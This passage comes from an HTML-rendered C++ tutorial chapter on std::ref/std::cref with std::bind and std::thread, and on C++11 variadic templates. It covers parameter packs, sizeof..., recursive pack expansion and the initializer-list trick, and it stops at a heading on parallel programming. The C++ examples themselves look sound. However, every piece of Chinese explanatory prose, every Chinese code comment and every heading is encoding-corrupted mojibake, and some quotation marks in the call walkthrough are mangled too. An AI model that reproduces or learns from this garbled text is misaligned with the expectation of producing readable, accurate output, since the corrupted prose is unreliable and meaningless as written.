<span class="comment">// è°ƒç”¨ func(100, 200, 300)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong><code>std::ref</code> å’Œ <code>std::cref</code>:</strong> (åœ¨ <code>&lt;functional&gt;</code> ä¸­) å½“ä½ æƒ³é€šè¿‡å€¼ä¼ é€’çš„åŒ…è£…å™¨ï¼ˆå¦‚ <code>std::bind</code>, <code>std::thread</code> æ„é€ å‡½æ•°, ç”šè‡³æŸäº›æƒ…å†µä¸‹çš„ <code>std::function</code>ï¼‰ä¼ é€’å‚æ•°çš„<strong>å¼•ç”¨</strong>æ—¶ï¼Œéœ€è¦ä½¿ç”¨ <code>std::ref</code> (ç”¨äºé const å¼•ç”¨) æˆ– <code>std::cref</code> (ç”¨äº const å¼•ç”¨) æ¥åŒ…è£…å‚æ•°ã€‚å®ƒä»¬åˆ›å»ºäº†ä¸€ä¸ªè½»é‡çº§çš„å¼•ç”¨åŒ…è£…å™¨å¯¹è±¡ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify_vector</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; vec)</span> </span>&#123; <span class="comment">// æ¥å—å¼•ç”¨</span></span><br><span class="line">    <span class="keyword">if</span> (!vec.empty()) &#123;</span><br><span class="line">        vec[<span class="number">0</span>] = <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; my_vec = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// std::bind é»˜è®¤æŒ‰å€¼å¤åˆ¶å‚æ•°</span></span><br><span class="line">    <span class="comment">// auto bound_copy = std::bind(modify_vector, my_vec); // é”™è¯¯æˆ–æ— æ•ˆï¼Œbind å¤åˆ¶äº† vector</span></span><br><span class="line">    <span class="comment">// bound_copy(); // ä¿®æ”¹çš„æ˜¯å‰¯æœ¬</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ std::ref ä¼ é€’å¼•ç”¨</span></span><br><span class="line">    <span class="keyword">auto</span> bound_ref = <span class="built_in">std</span>::bind(modify_vector, <span class="built_in">std</span>::ref(my_vec));</span><br><span class="line">    bound_ref(); <span class="comment">// æ­£ç¡®è°ƒç”¨ modify_vector(my_vec)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Vector after bind+ref: &quot;</span> &lt;&lt; my_vec[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 100</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// std::thread æ„é€ å‡½æ•°ä¹Ÿå¤åˆ¶å‚æ•°ï¼Œéœ€è¦ std::ref ä¼ é€’å¼•ç”¨</span></span><br><span class="line">    my_vec[<span class="number">0</span>] = <span class="number">1</span>; <span class="comment">// Reset</span></span><br><span class="line">    <span class="comment">// std::thread t1(modify_vector, my_vec); // çº¿ç¨‹æ“ä½œçš„æ˜¯ my_vec çš„å‰¯æœ¬</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::thread <span class="title">t2</span><span class="params">(modify_vector, <span class="built_in">std</span>::ref(my_vec))</span></span>; <span class="comment">// çº¿ç¨‹æ“ä½œçš„æ˜¯ my_vec çš„å¼•ç”¨</span></span><br><span class="line">    <span class="comment">// t1.join();</span></span><br><span class="line">    t2.join();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Vector after thread+ref: &quot;</span> &lt;&lt; my_vec[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 100</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>æ€»ä¹‹ï¼Œ<code>std::function</code> æ˜¯ä¸€ä¸ªå¼ºå¤§çš„é€šç”¨å‡½æ•°åŒ…è£…å™¨ï¼Œæä¾›äº†æå¤§çš„çµæ´»æ€§ï¼Œä½†åœ¨æ€§èƒ½æ•æ„Ÿçš„åœºæ™¯ä¸‹éœ€è¦æ³¨æ„å…¶æ½œåœ¨å¼€é”€ï¼Œå¹¶è€ƒè™‘ä½¿ç”¨æ¨¡æ¿ã€å‡½æ•°æŒ‡é’ˆæˆ–ç›´æ¥ä¼ é€’ Lambda ç­‰æ›¿ä»£æ–¹æ¡ˆã€‚</p><h2 id="18-6-å¯å˜å‚æ•°æ¨¡æ¿"><a href="#18-6-å¯å˜å‚æ•°æ¨¡æ¿" class="headerlink" title="18.6 å¯å˜å‚æ•°æ¨¡æ¿"></a>18.6 å¯å˜å‚æ•°æ¨¡æ¿</h2><p>åœ¨ C++11 ä¹‹å‰ï¼Œæ¨¡æ¿ï¼ˆå‡½æ•°æ¨¡æ¿å’Œç±»æ¨¡æ¿ï¼‰é€šå¸¸åªèƒ½æ¥å—å›ºå®šæ•°é‡çš„æ¨¡æ¿å‚æ•°ã€‚å¦‚æœä½ æƒ³ç¼–å†™ä¸€ä¸ªå¯ä»¥æ¥å—ä»»æ„æ•°é‡å‚æ•°çš„å‡½æ•°ï¼ˆç±»ä¼¼äº C è¯­è¨€ä¸­çš„ <code>printf</code>ï¼‰ï¼Œé€šå¸¸éœ€è¦ä¾èµ– C é£æ ¼çš„å¯å˜å‚æ•°æœºåˆ¶ (<code>&lt;cstdarg&gt;</code>)ï¼Œè¿™ç§æœºåˆ¶ä¸æ˜¯ç±»å‹å®‰å…¨çš„ã€‚</p><p>C++11 å¼•å…¥äº†<strong>å¯å˜å‚æ•°æ¨¡æ¿ (Variadic Templates)**ï¼Œå…è®¸æ¨¡æ¿ï¼ˆåŒ…æ‹¬å‡½æ•°æ¨¡æ¿å’Œç±»æ¨¡æ¿ï¼‰æ¥å—</strong>ä»»æ„æ•°é‡ã€ä»»æ„ç±»å‹**çš„æ¨¡æ¿å‚æ•°ï¼Œå¹¶åœ¨ç¼–è¯‘æ—¶è¿›è¡Œç±»å‹å®‰å…¨çš„å¤„ç†ã€‚</p><h3 id="18-6-1-æ¨¡æ¿å’Œå‡½æ•°å‚æ•°åŒ…"><a href="#18-6-1-æ¨¡æ¿å’Œå‡½æ•°å‚æ•°åŒ…" class="headerlink" title="18.6.1 æ¨¡æ¿å’Œå‡½æ•°å‚æ•°åŒ…"></a>18.6.1 æ¨¡æ¿å’Œå‡½æ•°å‚æ•°åŒ…</h3><p>å¯å˜å‚æ•°æ¨¡æ¿çš„æ ¸å¿ƒæ˜¯**å‚æ•°åŒ… (Parameter Pack)**ã€‚å‚æ•°åŒ…æœ‰ä¸¤ç§ï¼š</p><ol><li><p><strong>æ¨¡æ¿å‚æ•°åŒ… (Template Parameter Pack):</strong> ä»£è¡¨é›¶ä¸ªæˆ–å¤šä¸ªæ¨¡æ¿å‚æ•°ï¼ˆç±»å‹å‚æ•°ã€éç±»å‹å‚æ•°æˆ–æ¨¡æ¿å‚æ•°ï¼‰ã€‚</p><ul><li>  è¯­æ³•ï¼š<code>typename... Args</code> æˆ– <code>class... Args</code> (å¯¹äºç±»å‹å‚æ•°åŒ…)ï¼Œ<code>Type... args</code> (å¯¹äºéç±»å‹å‚æ•°åŒ…)ã€‚</li><li>  <code>...</code> (çœç•¥å·) æ˜¯å…³é”®éƒ¨åˆ†ï¼Œè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå‚æ•°åŒ…ã€‚</li></ul></li><li><p><strong>å‡½æ•°å‚æ•°åŒ… (Function Parameter Pack):</strong> ä»£è¡¨é›¶ä¸ªæˆ–å¤šä¸ªå‡½æ•°å‚æ•°ã€‚</p><ul><li>  è¯­æ³•ï¼š<code>Args... args</code>ï¼Œå…¶ä¸­ <code>Args</code> æ˜¯ä¸€ä¸ªæ¨¡æ¿å‚æ•°åŒ…ã€‚</li></ul></li></ol><p><strong>ç¤ºä¾‹ï¼šå®šä¹‰ä¸€ä¸ªæ¥å—ä»»æ„æ•°é‡å‚æ•°çš„å‡½æ•°æ¨¡æ¿</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰å¯å˜å‚æ•°å‡½æ•°æ¨¡æ¿ show_list</span></span><br><span class="line"><span class="comment">// Args æ˜¯ä¸€ä¸ªæ¨¡æ¿å‚æ•°åŒ… (ä»£è¡¨é›¶ä¸ªæˆ–å¤šä¸ªç±»å‹)</span></span><br><span class="line"><span class="comment">// args æ˜¯ä¸€ä¸ªå‡½æ•°å‚æ•°åŒ… (ä»£è¡¨é›¶ä¸ªæˆ–å¤šä¸ªå¯¹åº”ç±»å‹çš„å‚æ•°)</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span>... Args&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_list</span><span class="params">(Args... args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å¦‚ä½•å¤„ç† argsï¼Ÿè§ä¸‹æ–‡</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of arguments: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>...(Args) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// æˆ–è€… sizeof...(args) ä¹Ÿå¯ä»¥</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    show_list();                 <span class="comment">// Args ä¸ºç©º, args ä¸ºç©º. è¾“å‡º: Number of arguments: 0</span></span><br><span class="line">    show_list(<span class="number">1</span>);                <span class="comment">// Args = &#123;int&#125;, args = &#123;1&#125;. è¾“å‡º: Number of arguments: 1</span></span><br><span class="line">    show_list(<span class="number">1</span>, <span class="string">&quot;hello&quot;</span>);       <span class="comment">// Args = &#123;int, const char*&#125;, args = &#123;1, &quot;hello&quot;&#125;. è¾“å‡º: Number of arguments: 2</span></span><br><span class="line">    show_list(<span class="number">1</span>, <span class="number">3.14</span>, <span class="string">&#x27;c&#x27;</span>);     <span class="comment">// Args = &#123;int, double, char&#125;, args = &#123;1, 3.14, &#x27;c&#x27;&#125;. è¾“å‡º: Number of arguments: 3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sizeof...(Args)</code> æˆ– <code>sizeof...(args)</code> è¿ç®—ç¬¦å¯ä»¥åœ¨ç¼–è¯‘æ—¶è·å–å‚æ•°åŒ…ä¸­çš„å‚æ•°æ•°é‡ã€‚</p><h3 id="18-6-2-å±•å¼€å‚æ•°åŒ…"><a href="#18-6-2-å±•å¼€å‚æ•°åŒ…" class="headerlink" title="18.6.2 å±•å¼€å‚æ•°åŒ…"></a>18.6.2 å±•å¼€å‚æ•°åŒ…</h3><p>ä»…ä»…èƒ½æ¥å—ä»»æ„æ•°é‡çš„å‚æ•°è¿˜ä¸å¤Ÿï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¸€ç§æ–¹æ³•æ¥<strong>å¤„ç† (å±•å¼€, Unpack)</strong> å‚æ•°åŒ…ä¸­çš„æ¯ä¸€ä¸ªå‚æ•°ã€‚åœ¨ C++11 ä¸­ï¼Œå±•å¼€å‚æ•°åŒ…é€šå¸¸éœ€è¦ä½¿ç”¨<strong>é€’å½’ (Recursion)</strong> æˆ–å…¶ä»–ä¸€äº›æ¨¡æ¿æŠ€å·§ã€‚C++17 å¼•å…¥äº†æ›´ç®€æ´çš„**æŠ˜å è¡¨è¾¾å¼ (Fold Expressions)**ï¼Œä½†è¿™é‡Œæˆ‘ä»¬ä¸»è¦å…³æ³¨ C++11 çš„æ–¹æ³•ã€‚</p><p>å±•å¼€å‚æ•°åŒ…çš„å…³é”®åœ¨äº<strong>æ¨¡å¼åŒ¹é…</strong>å’Œ<strong>é€’å½’è°ƒç”¨</strong>ï¼šè®¾è®¡ä¸€ä¸ªå‡½æ•°æ¨¡æ¿ï¼Œå®ƒå¤„ç†å‚æ•°åŒ…ä¸­çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œç„¶åç”¨å‰©ä½™çš„å‚æ•°é€’å½’è°ƒç”¨è‡ªèº«ã€‚è¿˜éœ€è¦ä¸€ä¸ªå¤„ç†å‚æ•°åŒ…ä¸ºç©ºï¼ˆé€’å½’ç»ˆæ­¢ï¼‰çš„åŸºæœ¬æƒ…å†µã€‚</p><h3 id="18-6-3-åœ¨å¯å˜å‚æ•°æ¨¡æ¿å‡½æ•°ä¸­ä½¿ç”¨é€’å½’"><a href="#18-6-3-åœ¨å¯å˜å‚æ•°æ¨¡æ¿å‡½æ•°ä¸­ä½¿ç”¨é€’å½’" class="headerlink" title="18.6.3 åœ¨å¯å˜å‚æ•°æ¨¡æ¿å‡½æ•°ä¸­ä½¿ç”¨é€’å½’"></a>18.6.3 åœ¨å¯å˜å‚æ•°æ¨¡æ¿å‡½æ•°ä¸­ä½¿ç”¨é€’å½’</h3><p>æœ€å¸¸è§çš„å±•å¼€æ–¹å¼æ˜¯å®šä¹‰ä¸¤ä¸ªå‡½æ•°æ¨¡æ¿ï¼š</p><ol><li> ä¸€ä¸ª<strong>é€’å½’</strong>ç‰ˆæœ¬ï¼Œæ¥å—è‡³å°‘ä¸€ä¸ªå‚æ•°ï¼Œå¤„ç†ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œç„¶åç”¨å‰©ä½™å‚æ•°è°ƒç”¨è‡ªèº«ã€‚</li><li> ä¸€ä¸ª<strong>åŸºæœ¬æƒ…å†µ</strong>ç‰ˆæœ¬ï¼Œæ¥å—é›¶ä¸ªå‚æ•°ï¼Œä½œä¸ºé€’å½’çš„ç»ˆæ­¢æ¡ä»¶ã€‚</li></ol><p><strong>ç¤ºä¾‹ï¼šé€’å½’æ‰“å°æ‰€æœ‰å‚æ•°</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// åŸºæœ¬æƒ…å†µï¼šå½“å‚æ•°åŒ…ä¸ºç©ºæ—¶è°ƒç”¨æ­¤ç‰ˆæœ¬ï¼Œç»ˆæ­¢é€’å½’</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_values</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// é€’å½’ç»“æŸæ—¶æ‰“å°æ¢è¡Œ</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€’å½’ç‰ˆæœ¬ï¼šå¤„ç†ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œç„¶åç”¨å‰©ä½™å‚æ•°é€’å½’è°ƒç”¨</span></span><br><span class="line"><span class="comment">// Args æ˜¯æ¨¡æ¿å‚æ•°åŒ… (ä»£è¡¨å‰©ä½™å‚æ•°çš„ç±»å‹)</span></span><br><span class="line"><span class="comment">// args æ˜¯å‡½æ•°å‚æ•°åŒ… (ä»£è¡¨å‰©ä½™å‚æ•°çš„å€¼)</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span>... Args&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_values</span><span class="params">(<span class="keyword">const</span> T&amp; first_arg, <span class="keyword">const</span> Args&amp;... rest_args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1. å¤„ç†ç¬¬ä¸€ä¸ªå‚æ•°</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; first_arg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. å¦‚æœè¿˜æœ‰å‰©ä½™å‚æ•°ï¼Œæ‰“å°åˆ†éš”ç¬¦å¹¶é€’å½’è°ƒç”¨</span></span><br><span class="line">    <span class="function"><span class="keyword">if</span> <span class="title">constexpr</span> <span class="params">(<span class="keyword">sizeof</span>...(Args) &gt; <span class="number">0</span>)</span> </span>&#123; <span class="comment">// C++17 if constexpr, ç®€åŒ–æ¡ä»¶ç¼–è¯‘</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;, &quot;</span>;</span><br><span class="line">        print_values(rest_args...); <span class="comment">// å°†å‰©ä½™å‚æ•°åŒ…å±•å¼€å¹¶ä¼ é€’ç»™ä¸‹ä¸€æ¬¡è°ƒç”¨</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        print_values(); <span class="comment">// è°ƒç”¨åŸºæœ¬æƒ…å†µç‰ˆæœ¬ï¼Œæ‰“å°æ¢è¡Œ</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// C++11 å†™æ³• (æ²¡æœ‰ if constexpr):</span></span><br><span class="line">    <span class="comment">// if (sizeof...(Args) &gt; 0) &#123;</span></span><br><span class="line">    <span class="comment">//     std::cout &lt;&lt; &quot;, &quot;;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// print_values(rest_args...); // é€’å½’è°ƒç”¨ï¼Œæœ€ç»ˆä¼šè°ƒç”¨åˆ° print_values() ç‰ˆæœ¬</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Printing values:\n&quot;</span>;</span><br><span class="line">    print_values(<span class="number">1</span>, <span class="string">&quot;hello&quot;</span>, <span class="number">3.14</span>, <span class="string">&#x27;a&#x27;</span>); <span class="comment">// è¾“å‡º: 1, hello, 3.14, a</span></span><br><span class="line">    print_values(<span class="string">&quot;Single argument&quot;</span>);      <span class="comment">// è¾“å‡º: Single argument</span></span><br><span class="line">    print_values();                       <span class="comment">// è¾“å‡º: (ç©ºè¡Œ)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è°ƒç”¨è¿‡ç¨‹åˆ†æ <code>print_values(1, &quot;hello&quot;, 3.14, &#39;a&#39;)</code>:</strong></p><ol><li>è°ƒç”¨ <code>print_values&lt;int, const char*, double, char&gt;(1, &quot;hello&quot;, 3.14, &#39;a&#39;)</code><ul><li>  <code>first_arg</code> = 1, <code>rest_args...</code> = {â€œhelloâ€, 3.14, â€˜aâ€™}</li><li>  è¾“å‡º â€œ1, â€œ</li><li>  é€’å½’è°ƒç”¨ <code>print_values(&quot;hello&quot;, 3.14, &#39;a&#39;)</code></li></ul></li><li>è°ƒç”¨ <code>print_values&lt;const char*, double, char&gt;(&quot;hello&quot;, 3.14, &#39;a&#39;)</code><ul><li>  <code>first_arg</code> = â€œhelloâ€, <code>rest_args...</code> = {3.14, â€˜aâ€™}</li><li>  è¾“å‡º â€œhello, â€œ</li><li>  é€’å½’è°ƒç”¨ <code>print_values(3.14, &#39;a&#39;)</code></li></ul></li><li>è°ƒç”¨ <code>print_values&lt;double, char&gt;(3.14, &#39;a&#39;)</code><ul><li>  <code>first_arg</code> = 3.14, <code>rest_args...</code> = {â€˜aâ€™}</li><li>  è¾“å‡º â€œ3.14, â€œ</li><li>  é€’å½’è°ƒç”¨ <code>print_values(&#39;a&#39;)</code></li></ul></li><li>è°ƒç”¨ <code>print_values&lt;char&gt;(&#39;a&#39;)</code><ul><li>  <code>first_arg</code> = â€˜aâ€™, <code>rest_args...</code> = {} (ç©ºåŒ…)</li><li>  è¾“å‡º â€œaâ€</li><li>  é€’å½’è°ƒç”¨ <code>print_values()</code></li></ul></li><li>è°ƒç”¨ <code>print_values()</code> (åŸºæœ¬æƒ…å†µ)<ul><li>  è¾“å‡º <code>std::endl</code></li><li>  é€’å½’ç»“æŸ</li></ul></li></ol><p><strong>å±•å¼€è¯­æ³• <code>rest_args...</code>:</strong> å½“åœ¨å‡½æ•°è°ƒç”¨ä¸­å¯¹å‡½æ•°å‚æ•°åŒ…ä½¿ç”¨ <code>...</code> æ—¶ï¼Œå®ƒä¼šå°†åŒ…ä¸­çš„æ¯ä¸ªå…ƒç´ å±•å¼€ï¼Œä½œä¸ºç‹¬ç«‹çš„å‚æ•°ä¼ é€’ç»™å‡½æ•°ã€‚</p><p><strong>å…¶ä»–å±•å¼€æŠ€å·§ (C++11):</strong></p><p>è™½ç„¶é€’å½’æ˜¯æœ€å¸¸è§çš„æ–¹å¼ï¼Œä½†ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æŠ€å·§ï¼Œä¾‹å¦‚åˆ©ç”¨åˆå§‹åŒ–åˆ—è¡¨æˆ–æ•°ç»„çš„é€—å·è¿ç®—ç¬¦ç‰¹æ€§æ¥å±•å¼€ï¼Œä½†è¿™äº›æŠ€å·§é€šå¸¸æ›´å¤æ‚ä¸”å¯è¯»æ€§è¾ƒå·®ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨å±•å¼€ (æŠ€å·§æ€§è¾ƒå¼º)</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span>... Args&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_values_trick</span><span class="params">(<span class="keyword">const</span> Args&amp;... args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸€ä¸ªä¸´æ—¶ int æ•°ç»„ï¼Œåˆ©ç”¨åˆå§‹åŒ–åˆ—è¡¨å’Œé€—å·è¿ç®—ç¬¦</span></span><br><span class="line">    <span class="comment">// å¯¹åŒ…ä¸­çš„æ¯ä¸ªå‚æ•°æ‰§è¡Œ (std::cout &lt;&lt; arg &lt;&lt; &quot; &quot;, 0)</span></span><br><span class="line">    <span class="comment">// ç»“æœæ˜¯ &#123;0, 0, 0, ...&#125;ï¼Œä½†å‰¯ä½œç”¨æ˜¯æ‰“å°äº†å‚æ•°</span></span><br><span class="line">    <span class="keyword">int</span> dummy[] = &#123;<span class="number">0</span>, ( (<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; args &lt;&lt; <span class="string">&quot; &quot;</span>), <span class="number">0</span> )... &#125;;</span><br><span class="line">    <span class="comment">// (void)dummy; // é¿å…æœªä½¿ç”¨å˜é‡è­¦å‘Š (å¯é€‰)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     print_values_trick(<span class="number">10</span>, <span class="string">&quot;world&quot;</span>, <span class="number">0.5</span>); <span class="comment">// è¾“å‡º: 10 world 0.5</span></span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ç§æŠ€å·§åˆ©ç”¨äº† C++11 ä¸­ <code>...</code> å¯ä»¥åœ¨è¡¨è¾¾å¼ä¸­å±•å¼€å‚æ•°åŒ…çš„ç‰¹æ€§ <code>(pattern)...</code>ï¼Œå…¶ä¸­ <code>pattern</code> ä¼šå¯¹åŒ…ä¸­çš„æ¯ä¸ªå…ƒç´ åº”ç”¨ä¸€æ¬¡ã€‚</p><p>å¯å˜å‚æ•°æ¨¡æ¿æ˜¯ C++ å…ƒç¼–ç¨‹å’Œæ³›å‹ç¼–ç¨‹çš„å¼ºå¤§å·¥å…·ï¼Œä½¿å¾—ç¼–å†™èƒ½å¤Ÿå¤„ç†ä»»æ„æ•°é‡å‚æ•°çš„ç±»å‹å®‰å…¨å‡½æ•°ï¼ˆå¦‚è‡ªå®šä¹‰çš„ <code>printf</code>ã€<code>make_tuple</code>ã€<code>emplace_back</code> ç­‰ï¼‰æˆä¸ºå¯èƒ½ã€‚</p><h2 id="18-7-C-11æ–°å¢çš„å…¶ä»–åŠŸèƒ½"><a href="#18-7-C-11æ–°å¢çš„å…¶ä»–åŠŸèƒ½" class="headerlink" title="18.7 C++11æ–°å¢çš„å…¶ä»–åŠŸèƒ½"></a>18.7 C++11æ–°å¢çš„å…¶ä»–åŠŸèƒ½</h2><p>é™¤äº†å‰é¢ç« èŠ‚å·²ç»è¯¦ç»†è®¨è®ºæˆ–å›é¡¾çš„ä¸»è¦ç‰¹æ€§ï¼ˆå¦‚ <code>auto</code>, <code>nullptr</code>, ç»Ÿä¸€åˆå§‹åŒ–, ç§»åŠ¨è¯­ä¹‰, Lambda, æ™ºèƒ½æŒ‡é’ˆ, èŒƒå›´ <code>for</code>, æ–°ç±»åŠŸèƒ½, å¯å˜å‚æ•°æ¨¡æ¿ç­‰ï¼‰ä¹‹å¤–ï¼ŒC++11 æ ‡å‡†è¿˜å¼•å…¥äº†è®¸å¤šå…¶ä»–é‡è¦çš„åŠŸèƒ½å’Œåº“ï¼Œè¿›ä¸€æ­¥å¢å¼ºäº†è¯­è¨€çš„èƒ½åŠ›ã€‚æœ¬èŠ‚å°†ç®€è¦ä»‹ç»å…¶ä¸­çš„ä¸€äº›ã€‚</p><h3 id="18-7-1-å¹¶è¡Œç¼–ç¨‹"><a href="#18-7-1-å¹¶è¡Œç¼–ç¨‹" class="headerlink" title="18.7.1 